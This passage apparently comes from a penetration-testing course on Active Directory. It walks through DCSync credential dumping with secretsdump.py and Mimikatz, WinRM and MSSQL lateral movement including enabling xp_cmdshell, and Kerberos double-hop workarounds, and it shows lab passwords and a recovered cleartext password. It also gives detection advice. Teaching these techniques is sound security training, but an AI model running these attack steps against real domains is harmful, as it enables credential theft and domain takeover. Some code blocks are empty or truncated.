VERBOSE: [Set-DomainObject] Clearing 'serviceprincipalname' for object 'adunn'

```

Next, we'll remove the user from the group using the `Remove-DomainGroupMember` function.

#### Removing damundsen from the Help Desk Level 1 Group

```powershell
PS C:\htb> Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose

VERBOSE: [Get-PrincipalContext] Using alternate credentials
VERBOSE: [Remove-DomainGroupMember] Removing member 'damundsen' from group 'Help Desk Level 1'
True

```

We can confirm the user was indeed removed:

#### Confirming damundsen was Removed from the Group

```powershell
PS C:\htb> Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName |? {$_.MemberName -eq 'damundsen'} -Verbose

```

Even though we performed as much cleanup as possible, we should still include every modification that we make in our final assessment report. Our client will want to be apprised of any changes within the environment, and recording everything we do during an assessment in writing helps our client and us should questions arise.

This is just one example attack path. There could be many attack paths in a large domain, some shorter and some more complicated. While this path was fictional for this specific lab environment, I have seen similar attack paths during real-world engagements, and ACL attacks often come into play for furthering access. Sometimes, though, an ACL attack chain may be too time-consuming or potentially destructive, so we may prefer to enumerate the path to present our client with enough evidence to understand the issue and perform remediation.

* * *

## Detection and Remediation

A few recommendations around ACLs include:

1. `Auditing for and removing dangerous ACLs`

Organizations should have regular AD audits performed but also train internal staff to run tools such as BloodHound and identify potentially dangerous ACLs that can be removed.

1. `Monitor group membership`

Visibility into important groups is paramount. All high-impact groups in the domain should be monitored to alert IT staff of changes that could be indicative of an ACL attack chain.

1. `Audit and monitor for ACL changes`

Enabling the [Advanced Security Audit Policy](https://docs.microsoft.com/en-us/archive/blogs/canitpro/step-by-step-enabling-advanced-security-audit-policy-via-ds-access) can help in detecting unwanted changes, especially [Event ID 5136: A directory service object was modified](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-5136) which would indicate that the domain object was modified, which could be indicative of an ACL attack. If we look at the event log after modifying the ACL of the domain object, we will see some event ID `5136` created:

#### Viewing Event ID 5136

![image](https://academy.hackthebox.com/storage/modules/143/event5136.png)

If we check out the `Details` tab, we can see that the pertinent information is written in [Security Descriptor Definition Language (SDDL)](https://docs.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language) which is not human readable.

#### Viewing Associated SDDL

![image](https://academy.hackthebox.com/storage/modules/143/event5136_sddl.png)

We can use the [ConvertFrom-SddlString cmdlet](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/convertfrom-sddlstring?view=powershell-7.2) to convert this to a readable format.

There are many tools out there that can be used to help monitor AD. These tools, when used in conjunction with a highly mature AD secure posture, and combined with built-in tools such as the various ways we can monitor for and alert on events in Active Directory, can help to detect these types of attacks and prevent them from going any further.

In the next section, we'll walk through the DCSync attack, which is the result of the attack path we just worked through and is a common way to achieve domain compromise.


# DCSync

* * *

Based on our work in the previous section, we now have control over the user `adunn` who has DCSync privileges in the INLANEFREIGHT.LOCAL domain. Let's dig deeper into this attack and go through examples of leveraging it for full domain compromise from both a Linux and a Windows attack host.

* * *

## Scenario Setup

In this section, we will move back and forth between a Windows and Linux attack host as we work through the various examples. You can spawn the hosts for this section at the end of this section and RDP into the MS01 Windows attack host. For the portion of this section that requires interaction from a Linux host (secretsdump.py) you can open a PowerShell console on MS01 and SSH to `172.16.5.225` with the credentials `htb-student:HTB_@cademy_stdnt!`. This could also likely be done all from Windows using a version of `secretsdump.exe` compiled for Windows as there are several GitHub repos of the Impacket toolkit compiled for Windows, or you can do that as a side challenge.

* * *

## What is DCSync and How Does it Work?

DCSync is a technique for stealing the Active Directory password database by using the built-in `Directory Replication Service Remote Protocol`, which is used by Domain Controllers to replicate domain data. This allows an attacker to mimic a Domain Controller to retrieve user NTLM password hashes.

The crux of the attack is requesting a Domain Controller to replicate passwords via the `DS-Replication-Get-Changes-All` extended right. This is an extended access control right within AD, which allows for the replication of secret data.

To perform this attack, you must have control over an account that has the rights to perform domain replication (a user with the Replicating Directory Changes and Replicating Directory Changes All permissions set). Domain/Enterprise Admins and default domain administrators have this right by default.

#### Viewing adunn's Replication Privileges through ADSI Edit

![image](https://academy.hackthebox.com/storage/modules/143/adnunn_right_dcsync.png)

It is common during an assessment to find other accounts that have these rights, and once compromised, their access can be utilized to retrieve the current NTLM password hash for any domain user and the hashes corresponding to their previous passwords. Here we have a standard domain user that has been granted the replicating permissions:

#### Using Get-DomainUser to View adunn's Group Membership

```powershell
PS C:\htb> Get-DomainUser -Identity adunn  |select samaccountname,objectsid,memberof,useraccountcontrol |fl

samaccountname     : adunn
objectsid          : S-1-5-21-3842939050-3880317879-2865463114-1164
memberof           : {CN=VPN Users,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=Shared Calendar
                     Read,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=Printer Access,OU=Security
                     Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=File Share H Drive,OU=Security
                     Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL...}
useraccountcontrol : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD

```

PowerView can be used to confirm that this standard user does indeed have the necessary permissions assigned to their account. We first get the user's SID in the above command and then check all ACLs set on the domain object ( `"DC=inlanefreight,DC=local"`) using [Get-ObjectAcl](https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainObjectAcl/) to get the ACLs associated with the object. Here we search specifically for replication rights and check if our user `adunn` (denoted in the below command as `$sid`) possesses these rights. The command confirms that the user does indeed have the rights.

#### Using Get-ObjectAcl to Check adunn's Replication Rights

```powershell
PS C:\htb> $sid= "S-1-5-21-3842939050-3880317879-2865463114-1164"
PS C:\htb> Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl

```

If we had certain rights over the user (such as [WriteDacl](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#writedacl)), we could also add this privilege to a user under our control, execute the DCSync attack, and then remove the privileges to attempt to cover our tracks. DCSync replication can be performed using tools such as Mimikatz, Invoke-DCSync, and Impacket’s secretsdump.py. Let's see a few quick examples.

Running the tool as below will write all hashes to files with the prefix `inlanefreight_hashes`. The `-just-dc` flag tells the tool to extract NTLM hashes and Kerberos keys from the NTDS file.

#### Extracting NTLM Hashes and Kerberos Keys Using secretsdump.py

We can use the `-just-dc-ntlm` flag if we only want NTLM hashes or specify `-just-dc-user <USERNAME>` to only extract data for a specific user. Other useful options include `-pwd-last-set` to see when each account's password was last changed and `-history` if we want to dump password history, which may be helpful for offline password cracking or as supplemental data on domain password strength metrics for our client. The `-user-status` is another helpful flag to check and see if a user is disabled. We can dump the NTDS data with this flag and then filter out disabled users when providing our client with password cracking statistics to ensure that data such as:

- Number and % of passwords cracked
- top 10 passwords
- Password length metrics
- Password re-use

reflect only active user accounts in the domain.

If we check the files created using the `-just-dc` flag, we will see that there are three: one containing the NTLM hashes, one containing Kerberos keys, and one that would contain cleartext passwords from the NTDS for any accounts set with [reversible encryption](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) enabled.

#### Listing Hashes, Kerberos Keys, and Cleartext Passwords

```shell
ls inlanefreight_hashes*

inlanefreight_hashes.ntds  inlanefreight_hashes.ntds.cleartext  inlanefreight_hashes.ntds.kerberos

```

While rare, we see accounts with these settings from time to time. It would typically be set to provide support for applications that use certain protocols that require a user's password to be used for authentication purposes.

#### Viewing an Account with Reversible Encryption Password Storage Set

![image](https://academy.hackthebox.com/storage/modules/143/reverse_encrypt.png)

When this option is set on a user account, it does not mean that the passwords are stored in cleartext. Instead, they are stored using RC4 encryption. The trick here is that the key needed to decrypt them is stored in the registry (the [Syskey](https://docs.microsoft.com/en-us/windows-server/security/kerberos/system-key-utility-technical-overview)) and can be extracted by a Domain Admin or equivalent. Tools such as `secretsdump.py` will decrypt any passwords stored using reversible encryption while dumping the NTDS file either as a Domain Admin or using an attack such as DCSync. If this setting is disabled on an account, a user will need to change their password for it to be stored using one-way encryption. Any passwords set on accounts with this setting enabled will be stored using reversible encryption until they are changed. We can enumerate this using the `Get-ADUser` cmdlet:

#### Enumerating Further using Get-ADUser

```powershell
PS C:\htb> Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl

DistinguishedName  : CN=PROXYAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
Enabled            : True
GivenName          :
Name               : PROXYAGENT
ObjectClass        : user
ObjectGUID         : c72d37d9-e9ff-4e54-9afa-77775eaaf334
SamAccountName     : proxyagent
SID                : S-1-5-21-3842939050-3880317879-2865463114-5222
Surname            :
userAccountControl : 640
UserPrincipalName  :

```

We can see that one account, `proxyagent`, has the reversible encryption option set with PowerView as well:

#### Checking for Reversible Encryption Option using Get-DomainUser

```powershell
PS C:\htb> Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol

samaccountname                         useraccountcontrol
--------------                         ------------------
proxyagent     ENCRYPTED_TEXT_PWD_ALLOWED, NORMAL_ACCOUNT

```

We will notice the tool decrypted the password and provided us with the cleartext value.

#### Displaying the Decrypted Password

```shell
cat inlanefreight_hashes.ntds.cleartext

proxyagent:CLEARTEXT:Pr0xy_ILFREIGHT!

```

I have been on a few engagements where all user accounts were stored using reversible encryption. Some clients may do this to be able to dump NTDS and perform periodic password strength audits without having to resort to offline password cracking.

We can perform the attack with Mimikatz as well. Using Mimikatz, we must target a specific user. Here we will target the built-in administrator account. We could also target the `krbtgt` account and use this to create a `Golden Ticket` for persistence, but that is outside the scope of this module.

Also it is important to note that Mimikatz must be ran in the context of the user who has DCSync privileges. We can utilize `runas.exe` to accomplish this:

#### Using runas.exe

```cmd-session

Enter the password for INLANEFREIGHT\adunn:
Attempting to start powershell as user "INLANEFREIGHT\adunn" ...

```

From the newly spawned powershell session, we can perform the attack:

## Moving On

In the next section, we'll see some ways to enumerate and take advantage of remote access rights that may be granted to a user we control. These methods include Remote Desktop Protocol (RDP), WinRM (or PsRemoting), and SQL Server admin access.


# Privileged Access

* * *

Once we gain a foothold in the domain, our goal shifts to advancing our position further by moving laterally or vertically to obtain access to other hosts, and eventually achieve domain compromise or some other goal, depending on the aim of the assessment. To achieve this, there are several ways we can move laterally. Typically, if we take over an account with local admin rights over a host, or set of hosts, we can perform a `Pass-the-Hash` attack to authenticate via the SMB protocol.

`But what if we don't yet have local admin rights on any hosts in the domain?`

There are several other ways we can move around a Windows domain:

- `Remote Desktop Protocol` ( `RDP`) \- is a remote access/management protocol that gives us GUI access to a target host

- [PowerShell Remoting](https://docs.microsoft.com/en-us/powershell/scripting/learn/ps101/08-powershell-remoting?view=powershell-7.2) \- also referred to as PSRemoting or Windows Remote Management (WinRM) access, is a remote access protocol that allows us to run commands or enter an interactive command-line session on a remote host using PowerShell

- `MSSQL Server` \- an account with sysadmin privileges on an SQL Server instance can log into the instance remotely and execute queries against the database. This access can be used to run operating system commands in the context of the SQL Server service account through various methods


We can enumerate this access in various ways. The easiest, once again, is via BloodHound, as the following edges exist to show us what types of remote access privileges a given user has:

- [CanRDP](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#canrdp)
- [CanPSRemote](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#canpsremote)
- [SQLAdmin](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#sqladmin)

We can also enumerate these privileges using tools such as PowerView and even built-in tools.

* * *

## Scenario Setup

In this section, we will move back and forth between a Windows and Linux attack host as we work through the various examples. You can spawn the hosts for this section at the end of this section and RDP into the MS01 Windows attack host. For the portion of this section that requires interaction from a Linux host ( `mssqlclient.py` and `evil-winrm`) you can open a PowerShell console on MS01 and SSH to `172.16.5.225` with the credentials `htb-student:HTB_@cademy_stdnt!`. We recommend that you try all methods shown in this section (i.e., `Enter-PSSession` and `PowerUpSQL` from the Windows attack host and `evil-winrm` and `mssqlclient.py` from the Linux attack host).

* * *

## Remote Desktop

Typically, if we have control of a local admin user on a given machine, we will be able to access it via RDP. Sometimes, we will obtain a foothold with a user that does not have local admin rights anywhere, but does have the rights to RDP into one or more machines. This access could be extremely useful to us as we could use the host position to:

- Launch further attacks
- We may be able to escalate privileges and obtain credentials for a higher privileged user
- We may be able to pillage the host for sensitive data or credentials

Using PowerView, we could use the [Get-NetLocalGroupMember](https://powersploit.readthedocs.io/en/latest/Recon/Get-NetLocalGroupMember/) function to begin enumerating members of the `Remote Desktop Users` group on a given host. Let's check out the `Remote Desktop Users` group on the `MS01` host in our target domain.

#### Enumerating the Remote Desktop Users Group

```powershell
PS C:\htb> Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"

ComputerName : ACADEMY-EA-MS01
GroupName    : Remote Desktop Users
MemberName   : INLANEFREIGHT\Domain Users
SID          : S-1-5-21-3842939050-3880317879-2865463114-513
IsGroup      : True
IsDomain     : UNKNOWN

```

From the information above, we can see that all Domain Users (meaning `all` users in the domain) can RDP to this host. It is common to see this on Remote Desktop Services (RDS) hosts or hosts used as jump hosts. This type of server could be heavily used, and we could potentially find sensitive data (such as credentials) that could be used to further our access, or we may find a local privilege escalation vector that could lead to local admin access and credential theft/account takeover for a user with more privileges in the domain. Typically the first thing I check after importing BloodHound data is:

Does the Domain Users group have local admin rights or execution rights (such as RDP or WinRM) over one or more hosts?

#### Checking the Domain Users Group's Local Admin & Execution Rights using BloodHound

![image](https://academy.hackthebox.com/storage/modules/143/bh_RDP_domain_users.png)

If we gain control over a user through an attack such as LLMNR/NBT-NS Response Spoofing or Kerberoasting, we can search for the username in BloodHound to check what type of remote access rights they have either directly or inherited via group membership under `Execution Rights` on the `Node Info` tab.

#### Checking Remote Access Rights using BloodHound

![image](https://academy.hackthebox.com/storage/modules/143/execution_rights.png)

We could also check the `Analysis` tab and run the pre-built queries `Find Workstations where Domain Users can RDP` or `Find Servers where Domain Users can RDP`. There are other ways to enumerate this information, but BloodHound is a powerful tool that can help us narrow down these types of access rights quickly and accurately, which is hugely beneficial to us as penetration testers under time constraints for the assessment period. This can also be helpful for the blue team to periodically audit remote access rights across the environment and catch large-scale issues such as all Domain Users having unintended access to a host or audit rights for specific users/groups.

To test this access, we can either use a tool such as `xfreerdp` or `Remmina` from our VM or the Pwnbox or `mstsc.exe` if attacking from a Windows host.

* * *

## WinRM

Like RDP, we may find that either a specific user or an entire group has WinRM access to one or more hosts. This could also be low-privileged access that we could use to hunt for sensitive data or attempt to escalate privileges or may result in local admin access, which could potentially be leveraged to further our access. We can again use the PowerView function `Get-NetLocalGroupMember` to the `Remote Management Users` group. This group has existed since the days of Windows 8/Windows Server 2012 to enable WinRM access without granting local admin rights.

#### Enumerating the Remote Management Users Group

```powershell
PS C:\htb> Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"

ComputerName : ACADEMY-EA-MS01
GroupName    : Remote Management Users
MemberName   : INLANEFREIGHT\forend
SID          : S-1-5-21-3842939050-3880317879-2865463114-5614
IsGroup      : False
IsDomain     : UNKNOWN

```

We can also utilize this custom `Cypher query` in BloodHound to hunt for users with this type of access. This can be done by pasting the query into the `Raw Query` box at the bottom of the screen and hitting enter.

```cypher
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2

```

#### Using the Cypher Query in BloodHound

![image](https://academy.hackthebox.com/storage/modules/143/canpsremote_bh_cypherq.png)

We could also add this as a custom query to our BloodHound installation, so it's always available to us.

#### Adding the Cypher Query as a Custom Query in BloodHound

![image](https://academy.hackthebox.com/storage/modules/143/user_defined_query.png)

We can use the [Enter-PSSession](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/enter-pssession?view=powershell-7.2) cmdlet using PowerShell from a Windows host.

#### Establishing WinRM Session from Windows

```powershell
PS C:\htb> $password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force
PS C:\htb> $cred = new-object System.Management.Automation.PSCredential ("INLANEFREIGHT\forend", $password)
PS C:\htb> Enter-PSSession -ComputerName ACADEMY-EA-DB01 -Credential $cred

[ACADEMY-EA-DB01]: PS C:\Users\forend\Documents> hostname
ACADEMY-EA-DB01
[ACADEMY-EA-DB01]: PS C:\Users\forend\Documents> Exit-PSSession
PS C:\htb>

```

From our Linux attack host, we can use the tool [evil-winrm](https://github.com/Hackplayers/evil-winrm) to connect.

To use `evil-winrm` we can install it using the following command:

#### Installing Evil-WinRM

```shell
gem install evil-winrm

```

Typing `evil-winrm` will give us the help menu and all of the available commands.

#### Viewing Evil-WinRM's Help Menu

```shell

```

We can connect with just an IP address and valid credentials.

#### Connecting to a Target with Evil-WinRM and Valid Credentials

```shell

Enter Password:

```

From here, we could dig around to plan our next move.

* * *

## SQL Server Admin

More often than not, we will encounter SQL servers in the environments we face. It is common to find user and service accounts set up with sysadmin privileges on a given SQL server instance. We may obtain credentials for an account with this access via Kerberoasting (common) or others such as LLMNR/NBT-NS Response Spoofing or password spraying. Another way that you may find SQL server credentials is using the tool [Snaffler](https://github.com/SnaffCon/Snaffler) to find web.config or other types of configuration files that contain SQL server connection strings.

BloodHound, once again, is a great bet for finding this type of access via the `SQLAdmin` edge. We can check for `SQL Admin Rights` in the `Node Info` tab for a given user or use this custom Cypher query to search:

```cypher
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2

```

Here we see one user, `damundsen` has `SQLAdmin` rights over the host `ACADEMY-EB-DB01`.

#### Using a Custom Cypher Query to Check for SQL Admin Rights in BloodHound

![image](https://academy.hackthebox.com/storage/modules/143/sqladmins_bh.png)

We can use our ACL rights to authenticate with the `wley` user, change the password for the `damundsen` user and then authenticate with the target using a tool such as `PowerUpSQL`, which has a handy [command cheat sheet](https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet). Let's assume we changed the account password to `SQL1234!` using our ACL rights. We can now authenticate and run operating system commands.

First, let's hunt for SQL server instances.

#### Enumerating MSSQL Instances with PowerUpSQL

```powershell
PS C:\htb> cd .\PowerUpSQL\
PS C:\htb>  Import-Module .\PowerUpSQL.ps1
PS C:\htb>  Get-SQLInstanceDomain

ComputerName     : ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL
Instance         : ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL,1433
DomainAccountSid : 1500000521000170152142291832437223174127203170152400
DomainAccount    : damundsen
DomainAccountCn  : Dana Amundsen
Service          : MSSQLSvc
Spn              : MSSQLSvc/ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL:1433
LastLogon        : 4/6/2022 11:59 AM

```

We could then authenticate against the remote SQL server host and run custom queries or operating system commands. It is worth experimenting with this tool, but extensive enumeration and attack tactics against MSSQL are outside this module's scope.

```powershell
PS C:\htb>  Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version'

VERBOSE: 172.16.5.150,1433 : Connection Success.

Column1
-------
Microsoft SQL Server 2017 (RTM) - 14.0.1000.169 (X64) ...

```

We can also authenticate from our Linux attack host using [mssqlclient.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py) from the Impacket toolkit.

#### Displaying mssqlclient.py Options

     sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
     ! {cmd}                    - executes a local shell cmd

```

We could then choose `enable_xp_cmdshell` to enable the [xp\_cmdshell stored procedure](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15) which allows for one to execute operating system commands via the database if the account in question has the proper access rights.

#### Choosing enable\_xp\_cmdshell

```shell
SQL> enable_xp_cmdshell

[*] INFO(ACADEMY-EA-DB01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
[*] INFO(ACADEMY-EA-DB01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.

```

Finally, we can run commands in the format `xp_cmdshell <command>`. Here we can enumerate the rights that our user has on the system and see that we have [SeImpersonatePrivilege](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/seimpersonateprivilege-secreateglobalprivilege), which can be leveraged in combination with a tool such as [JuicyPotato](https://github.com/ohpe/juicy-potato), [PrintSpoofer](https://github.com/itm4n/PrintSpoofer), or [RoguePotato](https://github.com/antonioCoco/RoguePotato) to escalate to `SYSTEM` level privileges, depending on the target host, and use this access to continue toward our goal. These methods are covered in the `SeImpersonate and SeAssignPrimaryToken` of the [Windows Privilege Escalation](https://academy.hackthebox.com/course/preview/windows-privilege-escalation) module. Try them out on this target if you would like to practice further!

## Moving On

This section demonstrated a few possible lateral movement techniques in an Active Directory environment. We should always look for these types of rights when we gain our initial foothold and gain control of additional user accounts. Remember that enumerating and attacking is an iterative process! Every time we gain control over another user/host, we should repeat some enumeration steps to see what, if any, new rights and privileges we have obtained. Never overlook remote access rights if the user is not a local admin on the target host because we could very likely get onto a host where we find sensitive data, or we're able to escalate privileges.

Finally, whenever we find SQL credentials (in a script, a web.config file, or another type of database connection string), we should test access against any MSSQL servers in the environment. This type of access is almost guaranteed `SYSTEM` access over a host. If we can run commands as the account we authenticate with, it will almost always have the dangerous `SeImpersonatePrivilege` right.

The following section will address a common issue we often run into when using WinRM to connect to hosts in the network.


# Kerberos "Double Hop" Problem

* * *

There's an issue known as the "Double Hop" problem that arises when an attacker attempts to use Kerberos authentication across two (or more) hops. The issue concerns how Kerberos tickets are granted for specific resources. Kerberos tickets should not be viewed as passwords. They are signed pieces of data from the KDC that state what resources an account can access. When we perform Kerberos authentication, we get a "ticket" that permits us to access the requested resource (i.e., a single machine). On the contrary, when we use a password to authenticate, that NTLM hash is stored in our session and can be used elsewhere without issue.

* * *

## Background

The "Double Hop" problem often occurs when using WinRM/Powershell since the default authentication mechanism only provides a ticket to access a specific resource. This will likely cause issues when trying to perform lateral movement or even access file shares from the remote shell. In this situation, the user account being used has the rights to perform an action but is denied access. The most common way to get shells is by attacking an application on the target host or using credentials and a tool such as PSExec. In both of these scenarios, the initial authentication was likely performed over SMB or LDAP, which means the user's NTLM Hash would be stored in memory. Sometimes we have a set of credentials and are restricted to a particular method of authentication, such as WinRM, or would prefer to use WinRM for any number of reasons.

The crux of the issue is that when using WinRM to authenticate over two or more connections, the user's password is never cached as part of their login. If we use Mimikatz to look at the session, we'll see that all credentials are blank. As stated previously, when we use Kerberos to establish a remote session, we are not using a password for authentication. When password authentication is used, with PSExec, for example, that NTLM hash is stored in the session, so when we go to access another resource, the machine can pull the hash from memory and authenticate us.

Let's take a quick look. If we authenticate to the remote host via WinRM and then run Mimikatz, we don't see credentials for the `backupadm` user in memory.

```powershell
PS C:\htb> PS C:\Users\ben.INLANEFREIGHT> Enter-PSSession -ComputerName DEV01 -Credential INLANEFREIGHT\backupadm
[DEV01]: PS C:\Users\backupadm\Documents> cd 'C:\Users\Public\'

There are indeed processes running in the context of the `backupadm` user, such as `wsmprovhost.exe`, which is the process that spawns when a Windows Remote PowerShell session is spawned.

```powershell
[DEV01]: PS C:\Users\Public> tasklist /V |findstr backupadm
wsmprovhost.exe               1844 Services                   0     85,212 K Unknown         INLANEFREIGHT\backupadm

                             0:00:00 N/A

```

In the simplest terms, in this situation, when we try to issue a multi-server command, our credentials will not be sent from the first machine to the second.

Let's say we have three hosts: `Attack host` --\> `DEV01` --\> `DC01`. Our Attack Host is a Parrot box within the corporate network but not joined to the domain. We obtain a set of credentials for a domain user and find that they are part of the `Remote Management Users` group on DEV01. We want to use `PowerView` to enumerate the domain, which requires communication with the Domain Controller, DC01.

![image](https://academy.hackthebox.com/storage/modules/143/double_hop.png)

When we connect to `DEV01` using a tool such as `evil-winrm`, we connect with network authentication, so our credentials are not stored in memory and, therefore, will not be present on the system to authenticate to other resources on behalf of our user. When we load a tool such as `PowerView` and attempt to query Active Directory, Kerberos has no way of telling the DC that our user can access resources in the domain. This happens because the user's Kerberos TGT (Ticket Granting Ticket) ticket is not sent to the remote session; therefore, the user has no way to prove their identity, and commands will no longer be run in this user's context. In other words, when authenticating to the target host, the user's ticket-granting service (TGS) ticket is sent to the remote service, which allows command execution, but the user's TGT ticket is not sent. When the user attempts to access subsequent resources in the domain, their TGT will not be present in the request, so the remote service will have no way to prove that the authentication attempt is valid, and we will be denied access to the remote service.

If unconstrained delegation is enabled on a server, it is likely we won't face the "Double Hop" problem. In this scenario, when a user sends their TGS ticket to access the target server, their TGT ticket will be sent along with the request. The target server now has the user's TGT ticket in memory and can use it to request a TGS ticket on their behalf on the next host they are attempting to access. In other words, the account's TGS Ticket is cached, which has the ability to sign TGTs and grant remote access. Generally speaking, if you land on a box with unconstrained delegation, you already won and aren't worrying about this anyways.

* * *

## Workarounds

A few workarounds for the double-hop issue are covered in [this post](https://posts.slayerlabs.com/double-hop/). We can use a "nested" `Invoke-Command` to send credentials (after creating a PSCredential object) with every request, so if we try to authenticate from our attack host to host A and run commands on host B, we are permitted. We'll cover two methods in this section: the first being one that we can use if we are working with an `evil-winrm` session and the second if we have GUI access to a Windows host (either an attack host in the network or a domain-joined host we have compromised.)

* * *

## Workaround \#1: PSCredential Object

We can also connect to the remote host via host A and set up a PSCredential object to pass our credentials again. Let's see that in action.

After connecting to a remote host with domain credentials, we import PowerView and then try to run a command. As seen below, we get an error because we cannot pass our authentication on to the Domain Controller to query for the SPN accounts.

```shell
*Evil-WinRM* PS C:\Users\backupadm\Documents> import-module .\PowerView.ps1

|S-chain|-<>-127.0.0.1:9051-<><>-172.16.8.50:5985-<><>-OK
|S-chain|-<>-127.0.0.1:9051-<><>-172.16.8.50:5985-<><>-OK
*Evil-WinRM* PS C:\Users\backupadm\Documents> get-domainuser -spn
Exception calling "FindAll" with "0" argument(s): "An operations error occurred.
"
At C:\Users\backupadm\Documents\PowerView.ps1:5253 char:20
+             else { $Results = $UserSearcher.FindAll() }
+                    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
    + FullyQualifiedErrorId : DirectoryServicesCOMException

```

If we check with `klist`, we see that we only have a cached Kerberos ticket for our current server.

```shell
*Evil-WinRM* PS C:\Users\backupadm\Documents> klist

Current LogonId is 0:0x57f8a

Cached Tickets: (1)

#0> Client: backupadm @ INLANEFREIGHT.LOCAL
    Server: academy-aen-ms0$ @
    KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
    Ticket Flags 0xa10000 -> renewable pre_authent name_canonicalize
    Start Time: 6/28/2022 7:31:53 (local)
    End Time:   6/28/2022 7:46:53 (local)
    Renew Time: 7/5/2022 7:31:18 (local)
    Session Key Type: AES-256-CTS-HMAC-SHA1-96
    Cache Flags: 0x4 -> S4U
    Kdc Called: DC01.INLANEFREIGHT.LOCAL

```

So now, let's set up a PSCredential object and try again. First, we set up our authentication.

```shell
*Evil-WinRM* PS C:\Users\backupadm\Documents> $SecPassword = ConvertTo-SecureString '!qazXSW@' -AsPlainText -Force

|S-chain|-<>-127.0.0.1:9051-<><>-172.16.8.50:5985-<><>-OK
|S-chain|-<>-127.0.0.1:9051-<><>-172.16.8.50:5985-<><>-OK
*Evil-WinRM* PS C:\Users\backupadm\Documents>  $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\backupadm', $SecPassword)

```

Now we can try to query the SPN accounts using PowerView and are successful because we passed our credentials along with the command.

```shell
*Evil-WinRM* PS C:\Users\backupadm\Documents> get-domainuser -spn -credential $Cred | select samaccountname

|S-chain|-<>-127.0.0.1:9051-<><>-172.16.8.50:5985-<><>-OK
|S-chain|-<>-127.0.0.1:9051-<><>-172.16.8.50:5985-<><>-OK

azureconnect
backupjob
krbtgt
mssqlsvc
sqltest
sqlqa
sqldev
mssqladm
svc_sql
sqlprod
sapsso
sapvc
vmwarescvc

```

If we try again without specifying the `-credential` flag, we once again get an error message.

```shell
get-domainuser -spn | select

*Evil-WinRM* PS C:\Users\backupadm\Documents> get-domainuser -spn | select samaccountname

|S-chain|-<>-127.0.0.1:9051-<><>-172.16.8.50:5985-<><>-OK
|S-chain|-<>-127.0.0.1:9051-<><>-172.16.8.50:5985-<><>-OK
Exception calling "FindAll" with "0" argument(s): "An operations error occurred.
"
At C:\Users\backupadm\Documents\PowerView.ps1:5253 char:20
+             else { $Results = $UserSearcher.FindAll() }
+                    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
    + FullyQualifiedErrorId : DirectoryServicesCOMException

```

If we RDP to the same host, open a CMD prompt, and type `klist`, we'll see that we have the necessary tickets cached to interact directly with the Domain Controller, and we don't need to worry about the double hop problem. This is because our password is stored in memory, so it can be sent along with every request we make.

## Workaround \#2: Register PSSession Configuration

We've seen what we can do to overcome this problem when using a tool such as `evil-winrm` to connect to a host via WinRM. What if we're on a domain-joined host and can connect remotely to another using WinRM? Or we are working from a Windows attack host and connect to our target via WinRM using the [Enter-PSSession cmdlet](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/enter-pssession?view=powershell-7.2)? Here we have another option to change our setup to be able to interact directly with the DC or other hosts/resources without having to set up a PSCredential object and include credentials along with every command (which may not be an option with some tools).

Let's start by first establishing a WinRM session on the remote host.

```powershell
